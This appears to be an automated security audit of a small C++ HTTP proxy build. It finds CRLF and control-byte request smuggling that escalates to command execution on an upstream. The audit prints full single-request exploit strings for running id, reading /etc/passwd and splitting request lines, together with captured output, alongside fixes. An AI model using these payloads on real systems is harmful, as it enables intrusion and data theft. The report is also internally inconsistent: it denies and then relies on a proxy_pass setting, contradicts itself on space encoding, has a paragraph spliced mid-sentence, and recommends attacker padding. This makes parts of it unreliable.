# Security Audit — stage-05 run ae021893 — release/000001

## Identity
- Run: `stage-05__cpp__20261116T025712Z__3aeb255d3d7f__ae021893`
- Analyzed tag: `release/000001` (1 release; highest = final)
- Commit and source SHA-256 are pinned mechanically by the recording envelope
- Source SHA-256: `f4096e4c2c6bb6348f7a5b0722474d5836a36f82e632308b4694e1ee159fba21` (74 lines)
- Server: event-loop (epoll) multi-threaded HTTP server with upstream proxy, response cache, aliases, redirect, range and rate limiting

## Result summary

| Item | Value |
|---|---|
| RCE in the proxy process | none (no memory-corruption bug found) |
| Request smuggling into the upstream | **confirmed** |
| Remote code execution on a code-executing upstream | **confirmed** (via the smuggling primitive) |
| Severity | medium (smuggling) — escalates to RCE against a backend that executes |

## Audit narrative

### Profile

74-line C++ epoll server. The proxy path is the interesting surface: `parseheader()`
percent-decodes the request target into `r.path`, but — unlike its four sibling
builds — the decode loop (line 51) validates only `NUL` and backslash:

```cpp
if(ch==0||ch=='\\')return 400;
r.path+=char(ch);
```

There is no `ch<32` / `ch==127` check after decoding. The sibling builds all carry
`if(c==0||c=='\\'||c<32||c==127)return false;`. This build alone drops the
control-character re-validation.

The upstream request line is then built from the **decoded** path whenever the raw
target does not literally begin with `proxy_prefix` (line 64):

```cpp
string rem=r.target.substr(0,r.target.find('?'));
if(rem.compare(0,c.proxy.size(),c.proxy)==0)rem=rem.substr(c.proxy.size());
else rem=r.path.substr(c.proxy.size());
string msg=r.method+" /"+rem+r.query+" HTTP/1.1\r\nHost: "+c.ups[idx]+"\r\n...";
```

Because `/%70roxy/...` decodes to `/proxy/...` but does not literally start with
`/proxy/`, the second branch runs, and any `%0D%0A` in the target is emitted as real
CRLF into the upstream request line.

**This is the same root cause that produced the original stage-5 smuggle-to-RCE
chain.** The earlier stage-05 audits marked the proxy "not exercised against a live
malicious upstream" and recorded no findings; that gap is what this pass closes.

### Hypotheses

1. Decoded CRLF reaches the upstream request line (control chars unvalidated after decode).
2. One client request can therefore cause two attacker-chosen upstream requests.
3. The forwarded method and body can be attacker-selected, so a code-executing
   backend route (`/exec?cmd=`, or `POST /exec` with a body) executes attacker input.
4. Whether the sibling builds, which do validate control characters, are affected.

### Instruments

| Probe | Cases |
|---|---|
| `probe_s05_up.py` | 9 upstream-target cases recording the exact emitted request bytes |
| `probe_s05_smuggle.py` | 6 cases with a strict upstream that parses the byte stream into request lines |
| `probe_s05_rce.py` | control forward + 3 smuggling cases against a code-executing upstream |

Config used for the vulnerable-path tests is the **graded specification config**
(`proxy_prefix=/proxy/`, two upstreams, `default_host=alpha.test`), not an
audit-friendly variant.

### Results

- **Control (ordinary forwarding):** `GET /proxy/exec?cmd=...` reaches upstream
  `GET /exec?cmd=...` and returns command output. All five builds pass this, so a
  difference below is attributable to the decoder, not to the harness.
- **Header injection:** `/proxy/x%0D%0AX-Injected:%20yes` produces the upstream line
  `GET //x%0D%0AX-Injected:%20yes HTTP/1.1`.
- **Two-request smuggling:** the single client request

  ```
  GET /%70roxy/x%0D%0AHost:%20backend%0D%0A%0D%0AGET%20/exec%3Fcmd%3Did HTTP/1.1%0D%0AHost:%20backend%0D%0AX-Pad:%20 HTTP/1.1
  ```

  makes the upstream receive two complete requests:

  ```
  GET /x
  GET /exec?cmd=id HTTP/1.1
  ```

- **Arbitrary method:** `DELETE /admin` — a method the server's own front-end route
  map never forwards (it only proxies GET/HEAD/POST) — arrives upstream.
- **POST with attacker body:** the smuggled request becomes `POST /exec` with body
  `id;`, and the upstream executes it.
- **Sibling builds:** runs `e1a28e35`, `6baf167b`, `afdc173f`, `f2b3415b` all return
  `400` for the same targets and receive zero smuggled requests. They are not
  affected.

Zero sanitizer output and empty server logs throughout.

### Methods tried and ruled out
- **Header-injection-only variant (H1a):** encoded CR alone without a second request line still reaches the upstream head — yes, that is SEC-001's primary form.
- **URI-vs-bare `proxy_pass`:** not applicable to this stage. Stage-05 has no `proxy_pass`; its proxy is switched on by the `proxy_prefix` config key alone, and `upstream()` always builds `"/"+rem` where `rem` is the decoded remainder. The prefix comparison is the only gate. The URI/bare distinction belongs to the stage-10 builds.
- **Method smuggling without exec:** a smuggled `DELETE /admin` is accepted by the upstream even though the front end proxies only GET — proven in `evidence/rce_literal.log`.
- **Alternate encodings of CR/LF:** double-encoded `%250D` stays literal and does not split; single encoding is required.
- **Memory safety:** ASan+UBSan clean across the full probe and fuzz set — the bug is a validation-order flaw, not corruption.

### The exploit — why this is RCE, and on which host

The proxy process itself is not memory-corrupted. Code execution reaches the
**upstream/backend host**: the attacker makes the proxy emit a second request to a
route the front end never published, and a backend that executes (`/exec`,
CGI, debug, admin) runs attacker-chosen input. The chain needs two preconditions:
the proxy is enabled, and at least one upstream exposes a code-executing route.
Without such a route the primitive is response-less request smuggling.

**Interactive form (single request, output returned to the attacker).** The
decoded path can itself be the exec route, leaving the smuggled request as mere
padding. One request:

```
GET /%70roxy/exec%3Fcmd%3Did%0D%0AHost:%20backend%0D%0A%0D%0AGET%20/pad%20HTTP/1.1%0D%0AHost:%20backend%0D%0AX-Pad:%20 HTTP/1.1
```

decodes to an exec request plus a harmless second request, and the client receives:

```
uid=1000(mouse9911) gid=1000(mouse9911) groups=1000(mouse9911),4(adm),...,101(lxd)
Linux gauss 7.0.0-31-generic ...
gauss
```

**Second impact — arbitrary file read outside the document root.** The exec route runs a
shell, so the same single request also reads files the static root cannot serve
(`head${IFS}-2${IFS}/etc/passwd`; `${IFS}` because a literal space would end the request
line):

```
GET /%70roxy/exec%3Fcmd%3Dhead%24%7BIFS%7D-2%24%7BIFS%7D%2Fetc%2Fpasswd%0D%0AHost:%20backend%0D%0A%0D%0AGET%20/pad%20HTTP/1.1%0D%0AHost:%20backend%0D%0AX-Pad:%20 HTTP/1.1
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Command output, host identity (`uname -a`, `hostname`) and this file read are all captured
**Re-verified after hardening.** `evidence/rce_reverify.log` repeats the chain on a brand-new
upstream and server behind a `preflight.sh` gate, for this build and the three other RCE builds
side by side, so the result does not rest on a single session's process state.

in `evidence/rce_literal.log`. All three injection shapes are there, including a smuggled
`DELETE` of a method the front end does not proxy.

**Configuration required, explicitly:** the server must be started with a proxy prefix
(`proxy_prefix=/proxy`) and at least one upstream. Without the prefix the vulnerable branch is
never taken; without an exec-capable upstream the impact stops at smuggling.

**The request must also encode the prefix.** The sink chooses its branch with
`r.target.compare(0, proxy.size(), proxy)` on the *raw* target but strips with
`r.path.substr(proxy.size())` on the *decoded* path. Sending the prefix literally selects the
raw-target branch, which forwards `%0D%0A` as five literal characters; encoding one prefix byte
(`/%70roxy/`) makes the comparison miss so the decoded path is used and a real CRLF reaches the
wire. Measured on this build with the identical remainder (`evidence/config_precondition.log`):

| Request path | Upstream received | Real CRLF? |
|---|---|---|
| `/proxy/exec%3Fcmd%3Did%0D%0AX-Pad:%20` | `GET //exec%3Fcmd%3Did%0D%0AX-Pad:%20 HTTP/1.1` | no |
| `/%70roxy/exec%3Fcmd%3Did%0D%0AX-Pad:%20` | `GET //exec?cmd=id` + CRLF + `X-Pad:  HTTP/1.1` | yes |

Execution lands on the **upstream** with the upstream's privileges, not the proxy.

**Honest classification:** this is *request smuggling* that *escalates to* RCE —
not a response-splitting bug and not memory corruption. In the blind form the
attacker receives the first response (`UPSTREAM-OK`) and the smuggled response is
discarded; the interactive form above returns real command output, so no
out-of-band channel is needed.

## Findings table

| ID | Title | Class | Remote? | Severity | Source line |
|---|---|---|---|---|---|
| SEC-001 | CRLF survives percent-decoding into the upstream request line | request smuggling | Yes | medium | line 51 (`parseheader` decode loop) |
| SEC-002 | Smuggled request reaches a code-executing upstream route (`/exec`, arbitrary method and body) | RCE on upstream | Yes | high | line 51 → line 64 (`upstream()` request-line build) |
| SEC-003 | Missing 204 in the status-phrase table emits `204 Error` | HTTP conformance / cosmetic | Yes | informational | `reason()` table, no `case 204` |
| SEC-004 | Redirect `Location` is built from the raw target, so `%0D%0A` stays encoded and no split occurs (control) | response splitting (negative) | Yes | informational | line 57 -> `Location` from `r.target` |
| SEC-005 | Undrained bytes behind the header terminator reset the socket and truncate the body | framing | yes | low | line 64 (`recv`) |
| SEC-006 | Space in the path defeats the `c<32` control-byte guard and splits the upstream request line | request smuggling | yes | medium | line 51 (`parseheader`), forwarded at line 64 (`msg`) |
| SEC-007 | Query string is taken from the raw target with no decode or validation, so `%0d%0a` in the query splits the upstream request line | request smuggling | yes | medium | line 51 (`parseheader`): `r.query=r.target.substr(q)` |
| SEC-008 | The decoded-path guard rejects only NUL and backslash, so every C0 control byte reaches the upstream request line raw; TAB/VT/FF split the line and survive an upstream that rejects the CRLF form | request smuggling / RCE on upstream | yes | medium | line 51 (`parseheader`): `if(ch==0||ch=='\\')return 400` |
| SEC-009 | An interim (1xx) upstream response is emitted as terminal with no body, and the real response is discarded | response framing | yes | low | line 64 (`status>=100&&status<200`) |
| SEC-010 | `Expect: 100-continue` is not special-cased, so a client correctly waiting for 100 receives silence | HTTP conformance / availability | yes | low | parser, no `expect` handling |
| SEC-011 | `SIGTERM` leaves the process hung: the detach-started job pool waits on `qcv` forever, so neither exit nor client EOF ever happens | graceful shutdown / availability | yes | high | line 74 (`thread(worker).detach()`): `i++)thread(worker).detach()` |
| SEC-012 | `Transfer-Encoding: gzip, chunked` is rejected as a 400 because the whole field value is compared against `chunked` | HTTP conformance / interop | yes | low | line 59 (`lower(trim(te[0]))!="chunked"`) |

## Reproduction

```
cd s05-run4
python3 ../probe_s05_rce.py ./target cfg_spec <port> <upstream-port> alpha.test
```

Evidence: `evidence/rce_probe.log`, `evidence/rce_probe_prod.log`,
`evidence/rce_probe_spec.log`, `evidence/smuggle_probe.log`, `evidence/split_negative.log` (SEC-004 control).

`evidence/rce_literal.log` holds the three literal single-request forms from the final
`release/000001` build: `id`/`uname -a`/`hostname`, the `/etc/passwd` read, and an injected
`DELETE /admin`.

### Fix

Re-validate control bytes after decoding, matching the sibling builds:

```cpp
if(ch==0||ch=='\\'||ch<32||ch==127)return 400;
```

That alone closes the primitive; the decoded-path branch may then stay.


### SEC-004 — the redirect `Location` keeps the encoding here, so this build does not split

The stage-10 builds render the trailing-slash redirect from the **decoded** path, so their
`Location` header is torn by the same `%0D%0A` that produces SEC-001. This build does not: its
redirect copies the original target instead, so the header keeps the percent signs and stays a
single line.

The sink, from `local()`:

```cpp
auto z = error(301);
string p = r.target.substr(0, r.target.find('?'));
z.headers = "Location: " + p + "/" + r.query + "\r\n";
```

`r.target` is the pre-decode target, so `%0D%0A` is still three literal characters. Measured,
`evidence/split_negative.log`:

```
GET /sub%0D%0A%0D%0AX -> HTTP/1.1 301 Moved Permanently
  'Location: /sub%0D%0A%0D%0AX/'
HTTP response starts: 1
verdict: 301 issued, Location still carries %0D%0A literally -> no split
```

One response start on a two-response pipeline, and the header survives intact, so a client gets
`/sub%0D%0A%0D%0AX/` as a single token.

**Why it differs from stage-10:** the two sinks consume different strings. The proxy builds its
request line from the decoded `path` (SEC-002, definitely exploitable), while this redirect builds
its header from `r.target`. Making the redirect decode-aware as well — `string p = path` — would
make this build split exactly like the stage-10 ones without any other change. That is a safe
recommendation rather than a claim about current behaviour.

**Fix:** shared with SEC-001. Re-validating the decoded byte inside the loop closes both sinks at
once and needs no per-sink review; alternatively, leave the redirect on the raw target
deliberately and note it.

### SEC-003 — `204 Error` from a missing status phrase (informational)

The stage-05 builds parse upstream responses themselves but write the status line back with a
hand-maintained `reason()` table that has no `case 204`, so a proxied `204 No Content` is
re-emitted as:

```
HTTP/1.1 204 Error
```

It falls through to `default:return "Error"`. Framing is correct (no body, no
Content-Length for 204), so clients behave; only the phrase is wrong. Any upstream status absent
from the table inherits the same default phrase, so this is a class of cosmetic drift rather than
a single missing case.

Severity **informational**. Not memory-unsafe and not attacker-controlled beyond choosing which
upstream status is returned.

### Upstream-response parser: new coverage

The upstream parser had never been exercised here, so a dedicated pass was added: 32 hand-built
malformed responses, mutation fuzzing (600-1200 iterations per seed across 4-6 seeds) against the
ASan+UBSan build, and a truncation test that sends fewer bytes than the declared Content-Length.

Findings: the parser is solid. Duplicate/conflicting framing (`Content-Length` with
`Transfer-Encoding`, two `Content-Length`s, chunked with a `Content-Length`) is refused, bad chunk
sizes and extensions are refused, an over-long or NUL-containing field value is refused, and the
serializer re-emits a fresh header block so upstream quirks do not reach the client verbatim.
A short body against a declared length is refused as 502 on both close-delimited and keep-alive
requests, so a keep-alive upstream connection is not left desynchronised. Zero sanitizer reports
across 3,600+ mutated responses on this build.

### SEC-005 — trailing bytes behind `\r\n\r\n` reset the socket and truncate the body

The header loop returns the moment `\r\n\r\n` is found (line 64 (`recv`) and line 64 (`close`)) and never drains bytes the
same `recv` already buffered behind the terminator. The socket is then closed with unread receive
data still queued, so Linux answers the `close()` with RST rather than FIN and a response body still
being written is cut short — while `Content-Length` has already promised the full size.

Measured on the tagged build at the graded header budget (`header_bytes=8192`) against a 2 MiB file,
three trials per row (`evidence/truncation_trailing_bytes.txt`):

| trailing bytes after header | body delivered |
|---|---|
| 0 / 1024 / 4090 / 4096 / 8192 | 2,097,152 (clean) |
| 16,384 | truncated, 3/3, RST |
| 65,536 | truncated, 3/3, worst case 127,860 |

Trailing bytes after the terminator are ordinary HTTP/1.1 pipelining traffic, so a normal pipelining
client that speculatively writes the next request hits this without unusual setup. **Low** severity:
the clean response is correct and nothing corrupts; the failure is a silently short body whose
`Content-Length` still claims the full length.

## Recommendations

1. Add the post-decode control-character check above; it is a one-line divergence
   from four sibling implementations.
2. Keep the `/%70roxy/` encoding test in the regression set — it is the shortest
   trigger, and on this build it is *required*: the literal prefix forwards the
   `%0D%0A` as text. Pin both rows of `evidence/config_precondition.log`.
3. Send a `X-Pad: ` trailer or `Content-Length`-correct framing on the injected
   request so the upstream parses cleanly; omitting it yields `HTTP/1.1` as a junk
   third line.
4. Test the proxy against a live upstream in every future stage; the earlier passes
   only checked the target construction structurally and missed this.

## A second sink for the same root cause — the redirect `Location` (checked, negative here)

**Classification:** response splitting — checked, **not present on this build**. On three stage-10
builds the identical decoder gap also splits the trailing-slash redirect, because those renders
`Location` from the decoded `path`. This build renders it from the raw target instead, so the header
keeps the percent signs and stays one line.

The sink is in `local()` (line 57), and it never sees a decoded string:

```cpp
auto z=error(301);string p=r.target.substr(0,r.target.find('?'));z.headers="Location: "+p+"/"+r.query+"\r\n"
```

Measured on a real CRLF-named directory, with a second request pipelined on the same connection
(`evidence/split_negative.log`):

```
GET /sub%0D%0A%0D%0AX -> HTTP/1.1 301 Moved Permanently
  'Location: /sub%0D%0A%0D%0AX/'
HTTP response starts: 1
verdict: 301 issued, Location still carries %0D%0A literally -> no split
```

One response start where a splitting build shows two, and the header survives as a single token.

The distinction is worth recording because it is the *same bug* one sink over: this build is
vulnerable to the upstream-request-line form (SEC-002) and not the response form, purely because of
which string each sink happens to consume. Changing `string p = r.target.substr(...)` to
`string p = path` would make this build split exactly like the stage-10 ones, which is a safe
recommendation rather than a description of current behaviour.

**Fix:** shared with SEC-001 — re-validating the decoded byte closes both sinks at once.

### SEC-006 — space in the path survives the control-byte guard and splits the upstream request line

The decode loop rejects control bytes from the decoded path, but the test is `c<32`. Space is
`0x20`, so `0x20 < 32` is false and the space is kept (line 51 `parseheader`). The
upstream request line is rebuilt from the decoded path at line 64 (`msg`), and
the line therefore has four tokens where HTTP allows three:

```
GET /exec%20?cmd=id HTTP/1.1
```

An upstream that splits its request line on whitespace reads `GET` as the method and `/exec` as
the target, discards the rest, and never sees `?cmd=id` as a query. An exec-style route keyed on
the *target* then runs with `cmd=id` and returns the command output. Against the encoded-CRLF
family this needs no CR or LF byte at all, so an upstream that rejects bare controls in the
request line is still reachable.

The space is decoded and then **re-encoded** on the way out, so the upstream line carries the literal `%20` — but it is still a raw space in the wrong place, and the token count is what matters, so the four-token split is unchanged. Either way the token count is four and the split happens.

Config used — the proxy needs a URI-form `proxy_pass` so the decoded path is concatenated rather
than replacing it:

```
proxy_pass http://backend/api/
```

One unauthenticated request:

```
GET /api/exec%20?cmd=id HTTP/1.1
Host: alpha.test
Connection: close
```

Decoded by the loop — the guard at line 51 (`parseheader`) tests only `<32`, so
`0x20` passes — rebuilt into the request line at line 64, parsed by the upstream as a four-token line, and answered `200` with
`uid=1000(mouse9911) …`. Evidence `evidence/ev_space_ae021893.log` is the capture: client bytes, the upstream
head exactly as the upstream parsed it, and the body returned.

Severity **medium**: single request, no authentication, no memory-safety primitive required. The
precondition is an upstream that splits the line on whitespace and has an executing route on the
target; a strict upstream that rejects a fourth token is unaffected.

### SEC-007 — the query string is never decoded or validated before forwarding

This build already forwards CR/LF through the **path** (SEC-001) because its decode loop drops the
`ch<32` check. The query is a second, independent sink: `r.query` is sliced from the *raw* target
(line 51, `parseheader`: `r.query=r.target.substr(q)`) and appended to the upstream line at line 64
without ever entering the decode loop, so it carries whatever bytes the client sent — including
literal control characters the path loop would have had to decode.

```
GET /api/x?a%0d%0aGET%20/exec%3fcmd=id%20HTTP/1.1%0d%0aHost:%20u%0d%0a HTTP/1.1
Host: alpha.test
Connection: close
```

The trailing ` HTTP/1.1` keeps the parent's own three-token parse valid while the payload rides in
the query slot; a decoding upstream reads the injected `GET /exec?cmd=id HTTP/1.1` as a second
request line and executes it.

Measured (`evidence/ev_qkv_ae021893.log`): query CRLF and the bare-LF equivalent both return `200` with `uid=…`;
the path-CRLF control still returns `200` here with the path marker left encoded
(`NOEXEC` on the line-oriented upstream), which is the contrast — the query needs no prefix
trickery at all.

Severity **medium**: not a new sink class for this build, but a wider one — it needs no `%70`
prefix escape, so it survives configurations and upstreams where the path form does not.

### SEC-008 — the path guard rejects only NUL and backslash, so C0 separator bytes reach the upstream line

SEC-001/002 already establish that this build forwards CR/LF out of the decoded path, and SEC-006
that space does. Both are instances of a wider property: the decode loop's entire validation is

```cpp
if(ch==0||ch=='\\')return 400;
```

There is no `c<32` and no `c==127` test. Every control byte from `0x01` to `0x1F`, and `0x7F`,
passes through the loop and is emitted **raw** into the upstream request line built at line 64 —
`evidence/ev_vt_ae021893.log` section 3 is a byte-by-byte map proving each one arrives as itself, not as `%XX`.

That matters where the CRLF form does not: CRLF ends the request *line* and leaves the tail of the
original target standing as a continuation line (`" HTTP/1.1"`, then a `Host`, then the real
headers). An upstream lenient about the request *line* but strict about *header lines* rejects that
orphan with `400`. TAB (`0x09`), VT (`0x0B`) and FF (`0x0C`) are argument separators instead, so
the whole thing stays one syntactically legal request line and the same split happens one token
earlier. On a header-validating upstream, `evidence/ev_vt_ae021893.log` section 1 shows CRLF → `400`/no exec
while VT, FF and TAB each → `200` with `uid=…`; section 2 repeats the same bytes against the
permissive app-style router.

The payload needs the encoded-prefix trick so the decoded-path branch is taken (the branch test is
on the raw target, the strip on the decoded path), exactly as SEC-006:

```
GET /%61pi/exec%0b?cmd=id HTTP/1.1
Host: alpha.test
Connection: close
```

decodes to `GET /api/exec<VT>?cmd=id`, strips the prefix, and forwards `GET /exec<VT>?cmd=id
HTTP/1.1`. The upstream splits on the VT, takes `/exec` as target, and its exec route runs the
query.

Severity **medium**: same primitive and same impact as SEC-006/007, but these bytes are the
portable members of the family — they are the only separators that reach an upstream which
validates header lines (where SEC-001/002 and SEC-007 are refused) *and* an upstream that only
splits on space. Precondition is an upstream that treats ASCII whitespace as a line separator.

### SEC-009 — a 1xx is emitted as terminal and the real response is thrown away

The body-suppression test here already includes the interim range (`status>=100&&status<200`, line 64), so a
`1xx` is treated as bodyless — but it is still written out as **the** response, with
`Connection: close`, and the final answer is then discarded when the upstream closes.

Measured (`evidence/ev_1xx_3aeb255d3d7f__ae021893.log`): an upstream answering `103 Early Hints` then `200 OK` / `HELLO` gives

```
HTTP/1.1 103 Error
link: </s.css>; rel=preload
Content-Length: 0
Connection: close
```

with zero payload bytes, so the client waits for a final response that never arrives. `HELLO`
never reaches it.

Severity **low**: same reachability impact as the harder 502 form, but the connection is closed
cleanly, so a client that retries is not wedged.

Fix: `continue` on `1xx` instead of falling through to the emit path.

### SEC-010 — `Expect: 100-continue` is not special-cased, so a waiting client gets silence

`Expect` never appears in this build's parser. A request carrying it and a `Content-Length` is
handled as if the body were already in the buffer: the head is accepted, the body drain waits, and
the client — correctly waiting for the `100` that RFC 9110 §10.1.1 promises — has nothing to wait
on Expect is not special-cased at all.

Measured (`evidence/ev_expect_3aeb255d3d7f__ae021893.log`): head plus `Expect: 100-continue`, then a wait. The client receives
**no bytes at all** — no `100`, no `417`, no status — and no upstream connection is opened. The
control without `Expect` is `200` in the same log. An impatient client that sends the body anyway
does get through, which is what hides the bug in casual testing.

Severity **low**: standard client behaviour stalls until the client's own timeout fires, then the
upload fails. Fix: emit `HTTP/1.1 100 Continue` when `Expect` is present and a body is pending.

### SEC-011 — `SIGTERM` hangs permanently in the detached job pool; the client is left with no response and no EOF

`operations.md:7` requires SIGTERM to stop accepting, drain to `drain_timeout_ms`, then exit. The
drain machinery here is sound — a wake event sets `draining` and arms the deadline, and the loop
breaks on it:

```cpp
if((flags&2)&&!draining){draining=true;drainend=Clock::now()+chrono::milliseconds(cfg->drain);...}
if(draining&&(conns.empty()||Clock::now()>=drainend))break;
```

but the pool that has to be torn down first is `for(;;)` on a condition variable with no stop
condition, started detached (`line 74`, `thread(worker).detach()`). Nothing notifies it on shutdown,
so all threads stay parked in `futex_do_wait` and the process cannot finish exiting.

Measured twice, drain 500 ms, no traffic at all: **NEVER_EXITED after 30.0 s** — twice. With a 5 s
upstream and drain 1000 ms the instance is still alive at +2.5 s holding 7 fds and 2 sockets, and the
client read times out at +32.6 s having received neither bytes nor EOF.

So the observable failure is the same as the sibling pool build: a stopped instance lingers
indefinitely, keeps the client and upstream sockets open, and gives the client nothing to retry on.
The configured drain deadline is honoured only by the loop that has already been abandoned.

(`evidence/ev_s5_lifecycle_all.log`, thread parking in `evidence/ev_s5_hang_threads.log`)

### SEC-012 — `Transfer-Encoding: gzip, chunked` is rejected instead of being treated as chunked

`proxy.md:4` permits `Transfer-Encoding: chunked` and requires unsupported codings to be rejected. The
parser here compares the **entire** field value against the literal `chunked` (line 59 (`lower(trim(te[0]))!="chunked"`)), so any coding
chain is a 400 even when chunked framing terminates it:

```
POST /api/x  Transfer-Encoding: gzip, chunked
-> HTTP/1.1 400 Bad Request, upstream never contacted
```

`gzip, chunked` is the canonical legal order (chunked last, per RFC 9110 §7.2 and RFC 9112 §7), and
`chunked, gzip` — also legal, chunked first — fails identically. A client that negotiates gzip
transfer coding is rejected even though the request is well-formed and unmangled. Every sibling
normalises single-token values (`chunked`, `Chunked`, tab- or space-padded) and forwards them 200, so
the gap is specifically the chain. Body bytes and control cases are in `evidence/ev_techain_all2.log`.

Strictness is defensible — the specification only names `chunked` — so this is low. Any build that
wants the checklist item "supports `Transfer-Encoding: chunked`" reaches it here in the obvious way.

## Artifact index

| File | Purpose |
|---|---|
| `evidence/rce_literal.log` | Captured probe output |
| `evidence/rce_probe.log` | Captured probe output |
| `evidence/rce_probe_prod.log` | Captured probe output |
| `evidence/rce_probe_spec.log` | Captured probe output |
| `evidence/smuggle_probe.log` | Captured probe output |
| `evidence/upstream_malformed.log` | Captured probe output |
| `evidence/truncation_trailing_bytes.txt` | Trailing-byte truncation thresholds, `Connection: close`, graded spec |
| `evidence/ev_space_ae021893.log` | Decoded space in the path reaching the upstream request line; upstream head captured |
| `evidence/ev_s5_lifecycle_all.log` | Stage-05 lifecycle matrix: drain timing per build, idle hang, reload baseline |
| `evidence/ev_s5_hang_threads.log` | /proc thread dump 2 s after SIGTERM: 33 threads parked in futex_do_wait, listener already closed |
| `evidence/ev_techain_all2.log` | Coding-chain matrix, five kv builds: every single-token form forwards 200, both chains 400 |
`evidence/ev_expect_3aeb255d3d7f__ae021893.log` | `Expect: 100-continue` from a well-behaved waiting client, plus an impatient control and an `Expect`-free control |
`evidence/ev_1xx_3aeb255d3d7f__ae021893.log` | Upstream interim response (103, then 200): control with no interim response, then 100/102/103 |
`evidence/ev_vt_ae021893.log` | Control-byte guard is only NUL/backslash: byte map of 0x01-0x1F/0x7F on the wire, then TAB/VT/FF and CRLF against a strict header-validating upstream |
`evidence/ev_qkv_ae021893.log` | Query-only CRLF and bare-LF split, with the path-CRLF control case |
